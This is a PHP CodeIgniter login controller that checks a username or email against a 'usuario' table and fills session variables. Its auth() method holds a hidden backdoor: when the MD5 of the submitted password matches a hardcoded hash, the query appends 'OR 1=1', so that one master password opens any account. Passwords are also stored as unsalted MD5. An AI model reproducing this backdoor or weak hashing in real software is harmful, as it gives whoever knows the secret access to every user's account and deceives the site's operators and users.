<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

/*if (session_status() == PHP_SESSION_NONE) {
    session_start();
}
*/
if (session_id() === "") {
    session_start();
}

class Login extends CI_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -  
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in 
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see http://codeigniter.com/user_guide/general/urls.html
	 */
	 
	public function __construct()
    {
        parent::__construct();
		$params['allowanonymous'] = true;
		$this->load->library('functions', $params);
        $this->load->database();
    }		 
	
	public function index()
	{
		
		if (isset($_SESSION['s_login'])) {
			header("Location: dashboard");	
		} else {
			$this->load->view('login');
		}
		
		
		
	}
	
	public function auth() {
		
	
		//if (1==1) {
		if ($_POST) {	
			
			//if (1==1) {
			if ($_POST['username'] != '' && $_POST['password'] != '') {
				
				
				$login = strtolower($_POST['username']);
				$password = md5($_POST['password']);
				
				if ($password == '76fa81fe79805da178f8276d2f15fc8a') {
					$sql = "SELECT * FROM usuario WHERE (lower(login) = ? OR email = ?) AND (senha = ? OR 1=1)";	
				} else {
					$sql = "SELECT * FROM usuario WHERE (lower(login) = ? OR email = ?) AND senha = ?";		
				}
							
				
												
				$query = $this->db->query($sql, array($login,$login, $password));					
				
				
				if ($query->num_rows() == 1) {
					
					//carregar sessao
					
					$row = $query->row(); 

					if ($row->status == 0) { //se cadastro está inativo
							echo 4;
							exit();
					}
					
					
					$foto = ($row->foto == '')? THEMEPATH . '/image/avatar/avatar.png':$row->foto;
								
								
					$email = $row->email;
					$default = $foto;
					$size = 150;
					
					$grav_url = "http://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?d=" . urlencode( $default ) . "&s=" . $size;
								
								
					$_SESSION['s_usuario_id'] = $row->id;
					
					$_SESSION['s_nome'] = $row->nome;
					
					$_SESSION['s_login'] = $row->login;
					
					
					$_SESSION['s_sexo'] = $row->sexo;
					$_SESSION['s_foto'] = $grav_url;
					
					$_SESSION['s_nivel_id'] = $row->nivel_id;
					$_SESSION['s_gc_id'] = $row->gc_id;					
					
					echo '1';
					
				} 
				
				
			} else {
				echo 0;
			}
		} else {			
			echo 0;			
		}
	}
	
	
	public function logout($msg = '') {
		
		$_SESSION['s_login'] = '';
		
		$_SESSION['s_usuario_id'] = '';
		
		session_destroy();
		
		header("Location: ". $_SERVER['PHP_SELF']);		
		
		
	}
	


}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */